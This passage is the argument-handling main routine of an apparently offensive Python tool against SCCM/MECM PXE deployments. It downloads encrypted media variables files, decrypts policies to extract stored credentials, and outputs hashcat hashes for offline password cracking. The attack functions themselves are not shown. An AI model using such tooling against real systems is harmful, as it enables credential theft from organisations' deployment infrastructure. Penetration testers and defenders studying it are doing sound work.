    parser.add_argument("-b", "--parse-bcd", help="Parse a BCD (Boot Configuration Data) registry hive and print its objects/elements", nargs='?')

    args = parser.parse_args()

    SELECTED_INTERFACE = None

    # If mutually exclusive options are selected, print help and exit
    count = 1
    if (args.auto):
        count += 1
    if (args.manual):
        count += 1
    if (args.decrypt):
        count += 1
    if (args.crack):
        count += 1
    if (args.list_interfaces):
        count += 1
    if (args.parse_bcd):
        count += 1

    if (count > 2):
        print_nice("Please select only one option at a time", "ERROR")
        parser.print_help()
        sys.exit(0)
    elif (count < 2):
        print_nice("Please select an option", "ERROR")
        parser.print_help()
        sys.exit(0)

    if args.verbose:
        VERBOSE = True

    if (args.list_interfaces):
        list_network_interfaces()
        sys.exit(0)

    if (args.interface):
        # Interface should be an integer
        try:
            args.interface = int(args.interface)
        except ValueError:
            print_nice("Please provide the Interfaces Index from Scapy", "ERROR")
            list_network_interfaces()
            sys.exit(0)
        
        SELECTED_INTERFACE = args.interface

    if (args.url):
        base_url_override = validate_ip_or_resolve_hostname(args.url)
        if base_url_override is None:
            print_nice("Failed to resolve Management Point hostname or IP address.", "ERROR")
        else:
            SCCM_BASE_URL = args.url

    if (args.auto):
        print_nice("Finding and downloading encrypted media variables file from MECM server...")
        connection = configure_scapy_networking(None, SELECTED_INTERFACE)
        if (connection == True):
            get_pxe_files(None)

    elif (args.manual):
        if args.target is None:
            print_nice("Please provide a target IP address or hostname", "ERROR")
            parser.print_help()
        else:
            # TODO!
            # Convert a / to a list of IPs
            #ip_list = ipaddress.ip_network(args.target, strict=False)
            #ip_list = list(ip_list.hosts())

            #for ip in ip_list:
            #    # TODO!
            #    print_nice(f"Attempting to download media variables file from MECM server located at: {ip}", "INFO")
            #    print(f"Configuring Scapy networking for interface: {SELECTED_INTERFACE}", "INFO")
            #    configure_scapy_networking(str(ip), SELECTED_INTERFACE)
            #    get_pxe_files(str(ip))

            print_nice(f"Generating and downloading encrypted media variables file from MECM server located at: {args.target}")
            connection = configure_scapy_networking(args.target, SELECTED_INTERFACE)
            if (connection == True):            
                get_pxe_files(args.target)

    elif (args.decrypt):
        # Decrypt media variables file using password
        variables_path = None
        password = None
        policy_path = None
        bcd_path = None

        # Preflight Check for mutually exclusive options
        if (args.folder != None and args.variables != None):
            print_nice("Please select either a folder or a media variables file, not both", "ERROR")
            parser.print_help()
            sys.exit(0)

        # Folder Scanning
        if (args.folder != None):
            print_nice("Scanning folder for media variables file", "INFO")
            folder = args.folder
            # Catches the issue where an unescaped \\ is added to the end of the folder path
            if (folder.endswith("\"") == True):
                folder = folder[:-1]

            # Preflight check to ensure the folder exists
            if (os.path.isdir(folder) == False):
                print_nice("Folder does not exist, exiting", "ERROR")
                parser.print_help()
                sys.exit(0)

            variables_path, policy_path, bcd_path = scan_for_files(folder)
            if (VERBOSE):
                print_nice(f"Variables: {variables_path}", "INFO")
                print_nice(f"Policy: {variables_path}", "INFO")
                print_nice(f"BCD: {variables_path}", "INFO")


            
            if (variables_path == None):
                print_nice("No media variables file found in folder", "ERROR")
                sys.exit(0)

        # Raw flag for variables file
        if (args.variables != None):
            variables_path = args.variables
        elif (args.folder != None and args.variables == None):
            pass
        elif (variables_path == None):
            print_nice("Please provide a media variables file to decrypt", "ERROR")
            parser.print_help()
            sys.exit(0)

        if (args.policy != None):
            policy_path = args.policy

        if (args.bcd != None):
            bcd_path = args.bcd

        if (args.password != None):
            password = args.password
            if (password.startswith("0x")):
                # Hex encoded password, aka when we have a password used for boot.var files
                password = binascii.unhexlify(password[2:])
        
        media_variables, decrypted_policy = parse_media_files(password, variables_path, policy_path, bcd_path)

        if (media_variables != None):
            if (decrypted_policy == None):
                # Network Based / Standalone Media with a variables file only
                download_and_decrypt_policies_using_certificate(SMS_MEDIA_GUID, SMS_MEDIA_PFX)
            else:
                # Standalone Media with a variables file and policy file
                parse_files_for_credentials(decrypted_policy, decrypted_policy)
        else:
            # print_nice("Please provide either a media variables file and/optionally a policy file to decrypt", "ERROR")
            pass

    elif (args.crack):
        # Output the hash of a encrypted variables file to crack offline using hashcat
        if (args.variables is None):
            print_nice("Please provide a media variables file to generate the hash for", "ERROR")
        else:
            print_nice(f"Generating hash for media variables file: {args.variables}", "GREEN")
            generate_hashcat_output(args.variables)

    elif (args.parse_bcd):
        # Parse a BCD registry hive and print its boot configuration
        if (args.parse_bcd is None):
            print_nice("Please provide a BCD file to parse", "ERROR")
        else:
            print_nice(f"Parsing BCD file: {args.parse_bcd}", "INFO")
            parse_bcd(args.parse_bcd)
